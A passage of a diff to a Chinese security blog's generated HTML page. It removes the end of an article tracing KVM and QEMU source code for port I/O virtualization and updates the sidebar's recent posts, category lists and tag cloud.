class="line"></div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">vcpu-&gt;run-&gt;exit_reason = KVM_EXIT_IO;</div><div class="line"></div><div class="line">vcpu-&gt;run-&gt;io.direction = in ? KVM_EXIT_IO_IN : KVM_EXIT_IO_OUT;</div><div class="line"></div><div class="line">vcpu-&gt;run-&gt;io.size = size;</div><div class="line"></div><div class="line">vcpu-&gt;run-&gt;io.data_offset = KVM_PIO_PAGE_OFFSET * PAGE_SIZE;</div><div class="line"></div><div class="line">vcpu-&gt;run-&gt;io.count = count;</div><div class="line"></div><div class="line">vcpu-&gt;run-&gt;io.port = port;</div></pre></td></tr></table></figure>
-<p>此处就将pio保存到vcpu-&gt;arch.pio中了，注意exit_reason赋值为KVM_EXIT_IO</p>
-<p>麻烦点在x86_emulate_instruction函数，具体看</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> x86_emulate_ctxt &#123;</div><div class="line"></div><div class="line">        <span class="comment">/*操作对象*/</span></div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">struct</span> x86_emulate_ops *ops;</div><div class="line"></div><div class="line"><span class="comment">/* Register state before/after emulation. */</span></div><div class="line"></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</div><div class="line"></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> eip;  <span class="comment">/* eip before instruction emulation */</span></div><div class="line"></div><div class="line"><span class="comment">/* Emulated execution mode, represented by an X86EMUL_MODE value. */</span></div><div class="line"></div><div class="line"><span class="keyword">enum</span> x86emul_mode mode;</div><div class="line"></div><div class="line"><span class="comment">/* interruptibility state, as a result of execution of STI or MOV SS */</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> interruptibility;</div><div class="line"></div><div class="line"><span class="keyword">int</span> emul_flags;</div><div class="line"></div><div class="line"><span class="keyword">bool</span> perm_ok; <span class="comment">/* do not check permissions if true */</span></div><div class="line"></div><div class="line"><span class="keyword">bool</span> ud;<span class="comment">/* inject an #UD if host doesn't support insn */</span></div><div class="line"></div><div class="line"><span class="keyword">bool</span> have_exception;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> x86_exception exception;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"></div><div class="line">* decode cache</div><div class="line"></div><div class="line">*/</div><div class="line"></div><div class="line"><span class="comment">/* current opcode length in bytes */</span></div><div class="line"></div><div class="line">u8 opcode_len;</div><div class="line"></div><div class="line">u8 b;</div><div class="line"></div><div class="line">u8 intercept;</div><div class="line"></div><div class="line">u8 op_bytes;</div><div class="line"></div><div class="line">u8 ad_bytes;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> operand src;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> operand src2;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> operand dst;</div><div class="line"></div><div class="line"><span class="keyword">int</span> (*execute)(<span class="keyword">struct</span> x86_emulate_ctxt *ctxt);</div><div class="line"></div><div class="line"><span class="keyword">int</span> (*check_perm)(<span class="keyword">struct</span> x86_emulate_ctxt *ctxt);</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"></div><div class="line">* The following six fields are cleared together,</div><div class="line"></div><div class="line">* the rest are initialized unconditionally in x86_decode_insn</div><div class="line"></div><div class="line">* or elsewhere</div><div class="line"></div><div class="line">*/</div><div class="line"></div><div class="line"><span class="keyword">bool</span> rip_relative;</div><div class="line"></div><div class="line">u8 rex_prefix;</div><div class="line"></div><div class="line">u8 lock_prefix;</div><div class="line"></div><div class="line">u8 rep_prefix;</div><div class="line"></div><div class="line"><span class="comment">/* bitmaps of registers in _regs[] that can be read */</span></div><div class="line"></div><div class="line">u32 regs_valid;</div><div class="line"></div><div class="line"><span class="comment">/* bitmaps of registers in _regs[] that have been written */</span></div><div class="line"></div><div class="line">u32 regs_dirty;</div><div class="line"></div><div class="line"><span class="comment">/* modrm */</span></div><div class="line"></div><div class="line">u8 modrm;</div><div class="line"></div><div class="line">u8 modrm_mod;</div><div class="line"></div><div class="line">u8 modrm_reg;</div><div class="line"></div><div class="line">u8 modrm_rm;</div><div class="line"></div><div class="line">u8 modrm_seg;</div><div class="line"></div><div class="line">u8 seg_override;</div><div class="line"></div><div class="line">u64 d;</div><div class="line"></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> _eip;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> operand memop;</div><div class="line"></div><div class="line"><span class="comment">/* Fields above regs are cleared together. */</span></div><div class="line"></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> _regs[NR_VCPU_REGS];</div><div class="line"></div><div class="line"><span class="keyword">struct</span> operand *memopp;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> fetch_cache fetch;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> read_cache io_read;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> read_cache mem_read;</div><div class="line"></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="comment">//init_emulate_ctxt负责初始化这个结构体，</span></div><div class="line"></div><div class="line">ctxt-&gt;fetch.ptr = ctxt-&gt;fetch.data;</div><div class="line">ctxt-&gt;fetch.end = ctxt-&gt;fetch.data + insn_len;</div><div class="line"><span class="keyword">if</span> (insn_len &gt; <span class="number">0</span>)</div><div class="line">         <span class="comment">/*所有指令内容存放在data中*/</span></div><div class="line"><span class="built_in">memcpy</span>(ctxt-&gt;fetch.data, insn, insn_len);</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">        <span class="comment">/*如果没有指定指令的内容，就从当前eip读取一个指令*/</span></div><div class="line">rc = __do_insn_fetch_bytes(ctxt, <span class="number">1</span>);</div><div class="line"><span class="keyword">if</span> (rc != X86EMUL_CONTINUE)</div><div class="line"><span class="keyword">return</span> rc;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>都是将指令读取出来放到ctxt-&gt;fetch.data中而已，没有执行。</p>
-<p>看__do_insn_fetch_bytes函数，</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> cur_size = ctxt-&gt;fetch.end - ctxt-&gt;fetch.data;</div><div class="line"></div><div class="line"><span class="comment">/*下面的ea事实上应该说是指令decode时真正的eip，因为指令还没有被执行，eip没有</span></div><div class="line"></div><div class="line"> * 更新，所以每次decode计算eip都要加上已经decode的代码长度，就是cur_size */</div><div class="line"></div><div class="line"><span class="keyword">struct</span> segmented_address addr = &#123; .seg = VCPU_SREG_CS,</div><div class="line">  .ea = ctxt-&gt;eip + cur_size &#125;;</div><div class="line"></div><div class="line"><span class="comment">/*__linearize就是获取线性地址*/</span></div><div class="line"> la = seg_base(ctxt, addr.seg) + addr.ea;</div></pre></td></tr></table></figure>
-<p>后面的即是一些处理，如不满足权限的就要模拟gp错误，emulate_gp。</p>
-<p>然后是:</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rc = ctxt-&gt;ops-&gt;fetch(ctxt, linear, ctxt-&gt;fetch.end, size, &amp;ctxt-&gt;exception);</div></pre></td></tr></table></figure>
-<p>即kvm_fetch_guest_virt</p>
-<p>先通过vcpu-&gt;arch.walk_mmu-&gt;gva_to_gpa获取gpa的值，然后用kvm_vcpu_read_guest_page获取gpa对应的内存值，这两个函数不再展开。</p>
-<p>最终效果就是将linear对应的mem中大小为size的内容写入到ctxt-&gt;fetch.end指针对应的缓存中，因为ctxt-&gt;fetch.end = ctxt-&gt;fetch.data + insn_len而insn_len为0，则写入的是ctxt-&gt;fetch.data，在x86_decode_insn中，__do_insn_fetch_bytes就是从eip中copy了一个指令的内容到ctxt-&gt;fetch.data。x86_emulate_insn后面是指令解释的跳过。</p>
-<p>x86_emulate_instruction后面一段代码：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*exception在decode中产生*/</span></div><div class="line"><span class="keyword">if</span> (ctxt-&gt;have_exception) &#123;</div><div class="line">r = EMULATE_DONE;</div><div class="line"><span class="keyword">if</span> (inject_emulated_exception(vcpu))</div><div class="line"><span class="keyword">return</span> r;</div><div class="line"><span class="comment">/*decode会处理，pio的执行次数，针对串指令*/</span></div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (vcpu-&gt;arch.pio.count) &#123;</div><div class="line"><span class="comment">/*写入io的不特殊处理，只需完成写入即可*/</span></div><div class="line"><span class="keyword">if</span> (!vcpu-&gt;arch.pio.in) &#123;</div><div class="line"><span class="comment">/* <span class="doctag">FIXME:</span> return into emulator if single-stepping.  */</span></div><div class="line">vcpu-&gt;arch.pio.count = <span class="number">0</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">writeback = <span class="literal">false</span>;</div><div class="line"><span class="comment">/*读取io的则需要回头处理读的值的流程*/</span></div><div class="line">vcpu-&gt;arch.complete_userspace_io = complete_emulated_pio;</div><div class="line">&#125;</div><div class="line">r = EMULATE_USER_EXIT;</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (vcpu-&gt;mmio_needed) &#123;</div><div class="line"><span class="comment">/*同上*/</span></div><div class="line"><span class="keyword">if</span> (!vcpu-&gt;mmio_is_write)</div><div class="line">writeback = <span class="literal">false</span>;</div><div class="line">r= EMULATE_USER_EXIT;</div><div class="line">vcpu-&gt;arch.complete_userspace_io = complete_emulated_mmio;</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (r == EMULATION_RESTART)</div><div class="line"><span class="keyword">goto</span> restart;</div><div class="line"><span class="keyword">else</span></div><div class="line">r = EMULATE_DONE;</div></pre></td></tr></table></figure>
-<p>handle_io 返回return emulate_instruction(vcpu, 0) == EMULATE_DONE，即是kvm_x86_ops-&gt;handle_exit(vcpu)的返回值，返回值不大于0，则从vcpu_run循环中跳出到qemu mode。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (kvm_vcpu_running(vcpu)) &#123;</div><div class="line">r = vcpu_enter_guest(vcpu);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">r = vcpu_block(kvm, vcpu);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (r &lt;= <span class="number">0</span>)</div><div class="line"><span class="keyword">break</span>;</div></pre></td></tr></table></figure>
-<h3 id="0X03-PIO运行在QEMU"><a href="#0X03-PIO运行在QEMU" class="headerlink" title="0X03 PIO运行在QEMU"></a>0X03 PIO运行在QEMU</h3><p>在qemu kvm_cpu_exec函数中：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">switch</span> (run-&gt;exit_reason) &#123;</div><div class="line"><span class="comment">/*KVM_EXIT_IO是在emulator_pio_in_out标记的*/</span></div><div class="line">        <span class="keyword">case</span> KVM_EXIT_IO:</div><div class="line">            DPRINTF(<span class="string">"handle_io\n"</span>);</div><div class="line">            <span class="comment">/* Called outside BQL */</span></div><div class="line">            kvm_handle_io(run-&gt;io.port, attrs,</div><div class="line">                          (<span class="keyword">uint8_t</span> *)run + run-&gt;io.data_offset,</div><div class="line">                         run-&gt;io.direction,</div><div class="line">                          run-&gt;io.size,</div><div class="line">                          run-&gt;io.count);</div><div class="line">            ret = <span class="number">0</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> KVM_EXIT_MMIO:</div><div class="line">            DPRINTF(<span class="string">"handle_mmio\n"</span>);</div><div class="line">            <span class="comment">/* Called outside BQL */</span></div><div class="line">            address_space_rw(&amp;address_space_memory,</div><div class="line">                             run-&gt;mmio.phys_addr, attrs,</div><div class="line">                             run-&gt;mmio.data,</div><div class="line">                             run-&gt;mmio.len,</div><div class="line">                             run-&gt;mmio.is_write);</div><div class="line">            ret = <span class="number">0</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">kvm_handle_io</span><span class="params">(<span class="keyword">uint16_t</span> port, MemTxAttrs attrs, <span class="keyword">void</span> *data, <span class="keyword">int</span> direction,</span></span></div><div class="line"></div><div class="line">                          <span class="keyword">int</span> size, <span class="keyword">uint32_t</span> count)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">uint8_t</span> *ptr = data;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++) &#123;</div><div class="line">        <span class="comment">/*从qemu内存中读写数据，本质就成了mmio操作 */</span></div><div class="line">        address_space_rw(&amp;address_space_io, port, attrs, ptr, size, direction == KVM_EXIT_IO_OUT);</div><div class="line">        ptr += size;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>如果写IO此处就算完成了，如果读取IO，此时读取完成，还需要后面处理。</p>
-<p>处理在kvm_arch_vcpu_ioctl_run中的vcpu_run之前，</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (unlikely(vcpu-&gt;arch.complete_userspace_io)) &#123;</div><div class="line"><span class="keyword">int</span> (*cui)(<span class="keyword">struct</span> kvm_vcpu *) = vcpu-&gt;arch.complete_userspace_io;</div><div class="line">vcpu-&gt;arch.complete_userspace_io = <span class="literal">NULL</span>;</div><div class="line">r = cui(vcpu);</div><div class="line"><span class="keyword">if</span> (r &lt;= <span class="number">0</span>)</div><div class="line"><span class="keyword">goto</span> out;</div><div class="line">&#125; <span class="keyword">else</span></div><div class="line">WARN_ON(vcpu-&gt;arch.pio.count || vcpu-&gt;mmio_needed);</div></pre></td></tr></table></figure>
-<p>本质执行了complete_userspace_io函数，即是complete_emulated_pio。</p>
-<p>就是r = emulate_instruction(vcpu, EMULTYPE_NO_DECODE)，再次模拟IO指令，此时将数据读取到模拟的IO端口上，模拟完成即可。</p>
-<p>—结束—</p>
-<hr>
-<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/kvmsource-io/" target="_blank" rel="external">KVM源码分析之IO虚拟化之PIO</a>》及原作者信息:<a href="http://www.oenhan.com/about" target="_blank" rel="external">Oen Han</a></p>
-
-      
-    </div>
-    <footer class="entry-meta entry-footer">
-      
-	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/虚拟化原理/">虚拟化原理</a>
-
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/KVM/">KVM</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/QEMU/">QEMU</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li></ul>
-
-      
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
 
 
   <nav id="page-nav">
@@ -909,6 +897,18 @@ cd kbeast-v1
     </ul>
     <div class="widget">
       <ul>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170307/conference-ndss2017/">NDSS 2017 Accepted Papers</a></h6>
+          <!--  <span>三月 7, 2017</span> -->
+            </div>
+
+          </li>
         
           <li class="clearfix">
 
@@ -1090,18 +1090,6 @@ cd kbeast-v1
 
           </li>
         
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170223/obfuscation1/">X86 Shellcode代码混淆(一)</a></h6>
-          <!--  <span>二月 23, 2017</span> -->
-            </div>
-
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -1112,7 +1100,7 @@ cd kbeast-v1
   <div class="widget-wrap">
     <h3 class="widget-title">分类导航</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/二进制分析/">二进制分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/名人课堂/">名人课堂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/学术专家/">学术专家</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/恶意代码/">恶意代码</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化原理/">虚拟化原理</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化基础/">虚拟化基础</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化综合/">虚拟化综合</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机记录与重放/">虚拟机记录与重放</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机迁移/">虚拟机迁移</a></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/主流会议/">主流会议</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制分析/">二进制分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/名人课堂/">名人课堂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/学术专家/">学术专家</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/恶意代码/">恶意代码</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化原理/">虚拟化原理</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化基础/">虚拟化基础</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化综合/">虚拟化综合</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机记录与重放/">虚拟机记录与重放</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机迁移/">虚拟机迁移</a></li></ul>
     </div>
   </div>
 
@@ -1122,7 +1110,7 @@ cd kbeast-v1
   <div class="widget-wrap">
     <h3 class="widget-title">标签导航</h3>
     <div class="widget tagcloud">
-      <a href="/tags/ASLR/" style="font-size: 11.82px;">ASLR</a> <a href="/tags/Binary/" style="font-size: 10.91px;">Binary</a> <a href="/tags/Compiler/" style="font-size: 10px;">Compiler</a> <a href="/tags/Conference/" style="font-size: 10px;">Conference</a> <a href="/tags/Course/" style="font-size: 13.64px;">Course</a> <a href="/tags/Exploit/" style="font-size: 17.27px;">Exploit</a> <a href="/tags/Forensics/" style="font-size: 10px;">Forensics</a> <a href="/tags/Heap/" style="font-size: 10.91px;">Heap</a> <a href="/tags/Instrumentation/" style="font-size: 10px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 14.55px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 16.36px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 15.45px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 13.64px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 13.64px;">Linux</a> <a href="/tags/Malware/" style="font-size: 10.91px;">Malware</a> <a href="/tags/Memory/" style="font-size: 13.64px;">Memory</a> <a href="/tags/Migration/" style="font-size: 10.91px;">Migration</a> <a href="/tags/Overflow/" style="font-size: 10.91px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/Papers/" style="font-size: 10px;">Papers</a> <a href="/tags/Professor/" style="font-size: 12.73px;">Professor</a> <a href="/tags/QEMU/" style="font-size: 15.45px;">QEMU</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/RR/" style="font-size: 10px;">RR</a> <a href="/tags/Rootkit/" style="font-size: 10px;">Rootkit</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Stack/" style="font-size: 10.91px;">Stack</a> <a href="/tags/System/" style="font-size: 19.09px;">System</a> <a href="/tags/Systemcall/" style="font-size: 11.82px;">Systemcall</a> <a href="/tags/Virtualization/" style="font-size: 18.18px;">Virtualization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a> <a href="/tags/XEN/" style="font-size: 10px;">XEN</a>
+      <a href="/tags/ASLR/" style="font-size: 11.82px;">ASLR</a> <a href="/tags/Binary/" style="font-size: 10.91px;">Binary</a> <a href="/tags/Compiler/" style="font-size: 10px;">Compiler</a> <a href="/tags/Conference/" style="font-size: 10.91px;">Conference</a> <a href="/tags/Course/" style="font-size: 13.64px;">Course</a> <a href="/tags/Exploit/" style="font-size: 17.27px;">Exploit</a> <a href="/tags/Forensics/" style="font-size: 10px;">Forensics</a> <a href="/tags/Heap/" style="font-size: 10.91px;">Heap</a> <a href="/tags/Instrumentation/" style="font-size: 10px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 14.55px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 16.36px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 15.45px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 13.64px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 13.64px;">Linux</a> <a href="/tags/Malware/" style="font-size: 10.91px;">Malware</a> <a href="/tags/Memory/" style="font-size: 13.64px;">Memory</a> <a href="/tags/Migration/" style="font-size: 10.91px;">Migration</a> <a href="/tags/Overflow/" style="font-size: 10.91px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/Paper/" style="font-size: 10px;">Paper</a> <a href="/tags/Papers/" style="font-size: 10px;">Papers</a> <a href="/tags/Professor/" style="font-size: 12.73px;">Professor</a> <a href="/tags/QEMU/" style="font-size: 15.45px;">QEMU</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/RR/" style="font-size: 10px;">RR</a> <a href="/tags/Rootkit/" style="font-size: 10px;">Rootkit</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Stack/" style="font-size: 10.91px;">Stack</a> <a href="/tags/System/" style="font-size: 19.09px;">System</a> <a href="/tags/Systemcall/" style="font-size: 11.82px;">Systemcall</a> <a href="/tags/Virtualization/" style="font-size: 18.18px;">Virtualization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a> <a href="/tags/XEN/" style="font-size: 10px;">XEN</a>
     </div>
   </div>
 
